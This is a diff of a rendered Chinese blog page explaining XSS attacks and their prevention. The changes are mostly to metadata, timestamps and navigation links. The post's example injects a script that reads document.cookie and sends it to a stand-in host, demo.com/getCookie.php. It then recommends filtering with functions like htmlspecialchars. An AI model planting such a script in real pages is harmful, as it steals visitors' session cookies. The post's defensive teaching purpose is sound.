@@ -109,18 +109,18 @@
 
 
 
-  <meta name="description" content="什么是XSS?XSS 攻击，即跨站脚本攻击（Cross Site Scripting），它是 web 程序中常见的漏洞。  XSS如何攻击?其原理是攻击者往 web 页面里插入恶意的脚本代码（CSS代码、JavaScript代码等），当用户浏览该页面时，嵌入其中的脚本代码会被执行，从而达到恶意攻击用户的目的。如盗取用户cookie，破坏页面结构、重定向到其他网站等。 举个列子: ​">
+  <meta name="description" content="什么是XSS?XSS 攻击，即跨站脚本攻击（Cross Site Scripting），它是 web 程序中常见的漏洞。">
 <meta name="keywords" content="如何预防XSS攻击?">
 <meta property="og:type" content="article">
 <meta property="og:title" content="如何预防XSS攻击?">
 <meta property="og:url" content="http://www.leijunblog.com/2016/01/06/如何预防XSS攻击/index.html">
 <meta property="og:site_name" content="LeiJun&#39;s Blog">
-<meta property="og:description" content="什么是XSS?XSS 攻击，即跨站脚本攻击（Cross Site Scripting），它是 web 程序中常见的漏洞。  XSS如何攻击?其原理是攻击者往 web 页面里插入恶意的脚本代码（CSS代码、JavaScript代码等），当用户浏览该页面时，嵌入其中的脚本代码会被执行，从而达到恶意攻击用户的目的。如盗取用户cookie，破坏页面结构、重定向到其他网站等。 举个列子: ​">
+<meta property="og:description" content="什么是XSS?XSS 攻击，即跨站脚本攻击（Cross Site Scripting），它是 web 程序中常见的漏洞。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-09-08T03:38:39.605Z">
+<meta property="og:updated_time" content="2018-09-08T04:00:04.831Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="如何预防XSS攻击?">
-<meta name="twitter:description" content="什么是XSS?XSS 攻击，即跨站脚本攻击（Cross Site Scripting），它是 web 程序中常见的漏洞。  XSS如何攻击?其原理是攻击者往 web 页面里插入恶意的脚本代码（CSS代码、JavaScript代码等），当用户浏览该页面时，嵌入其中的脚本代码会被执行，从而达到恶意攻击用户的目的。如盗取用户cookie，破坏页面结构、重定向到其他网站等。 举个列子: ​">
+<meta name="twitter:description" content="什么是XSS?XSS 攻击，即跨站脚本攻击（Cross Site Scripting），它是 web 程序中常见的漏洞。">
 
 
 
@@ -426,7 +426,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2018-09-08 11:38:39" itemprop="dateModified" datetime="2018-09-08T11:38:39+08:00">2018-09-08</time>
+                <time title="Updated at: 2018-09-08 12:00:04" itemprop="dateModified" datetime="2018-09-08T12:00:04+08:00">2018-09-08</time>
               
             
           </span>
@@ -487,10 +487,10 @@
       
 
       
-        <h4 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS?"></a>什么是XSS?</h4><p>XSS 攻击，即跨站脚本攻击（Cross Site Scripting），它是 web 程序中常见的漏洞。 </p>
+        <h4 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS?"></a>什么是XSS?</h4><p>XSS 攻击，即跨站脚本攻击（Cross Site Scripting），它是 web 程序中常见的漏洞。<a id="more"></a> </p>
 <h4 id="XSS如何攻击"><a href="#XSS如何攻击" class="headerlink" title="XSS如何攻击?"></a>XSS如何攻击?</h4><p>其原理是攻击者往 web 页面里插入恶意的脚本代码（CSS代码、JavaScript代码等），当用户浏览该页面时，嵌入其中的脚本代码会被执行，从而达到恶意攻击用户的目的。如盗取用户cookie，破坏页面结构、重定向到其他网站等。 举个列子:</p>
-<p>​                     有一个web页面,内含表单共用户发表文章(如博客网站),假如我是一个攻击者,我会在内容中添加一些攻击代码,比如盗取其他用户cookie信息:</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This <span class="keyword">is</span> a XSS test!</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var cookie = document.cookie;</span><br><span class="line">window.open(<span class="string">"http://demo.com/getCookie.php?param="</span>+cookie)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>有一个web页面,内含表单共用户发表文章(如博客网站),假如我是一个攻击者,我会在内容中添加一些攻击代码,比如盗取其他用户cookie信息:
+</code></pre><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This <span class="keyword">is</span> a XSS test!</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var cookie = document.cookie;</span><br><span class="line">window.open(<span class="string">"http://demo.com/getCookie.php?param="</span>+cookie)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 <p>如果该网页管理者没有对我提交的表单内容做任何过滤处理,当其他用户查看我的内容时,,其他用户的cookie信息就会发送至我的<a href="http://demo.com站点,被我盗取。" target="_blank" rel="noopener">http://demo.com站点,被我盗取。</a></p>
 <h4 id="如何预防"><a href="#如何预防" class="headerlink" title="如何预防?"></a>如何预防?</h4><p>要想防范攻击我们就需要对用户提交的表单内容进行过滤,有时数据库也有可能被攻击,这时就需要对模板中的输出数据也进行过滤,所以总结起来一般就这两种常见方法:</p>
 <ul>
@@ -506,7 +506,6 @@
 <li><p>在 PHP 中，可以使用 htmlspecialchars 或 htmlentities 函数对用户提交的表单数据进行过滤。</p>
 </li>
 </ul>
-<a id="more"></a>
 
       
     </div>
@@ -540,8 +539,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/08/11/点击劫持攻击/" rel="next" title="点击劫持攻击">
-                <i class="fa fa-chevron-left"></i> 点击劫持攻击
+              <a href="/2016/01/06/SQL注入攻击/" rel="next" title="SQL注入攻击">
+                <i class="fa fa-chevron-left"></i> SQL注入攻击
               </a>
             
           </div>
@@ -550,8 +549,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2016/01/06/SQL注入攻击/" rel="prev" title="SQL注入攻击">
-                SQL注入攻击 <i class="fa fa-chevron-right"></i>
+              <a href="/2016/06/13/Celery的简单安装与应用/" rel="prev" title="celery的简单安装及应用">
+                celery的简单安装及应用 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
